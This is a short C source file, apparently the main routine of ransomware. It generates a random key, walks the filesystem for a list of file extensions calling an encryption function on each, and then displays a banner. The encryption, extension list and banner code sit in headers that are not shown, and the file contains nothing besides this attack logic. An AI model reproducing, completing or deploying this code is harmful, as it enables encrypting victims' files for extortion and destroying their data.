#include "crypt.h"
#include "banner.h"
#include "utils.h"


typedef struct {
    File file;
} FileToRename;

void init() {
    banner();
}

int main() {
    mkdir(TEMP_DIR, 0777);

    char key[KEY_SIZE];
    generate_random_key(key);

    for (int i = 0; extensions[i]; i++) {
        walk_encrypt(extensions[i], key);
    }

    init();

    return 0;
}
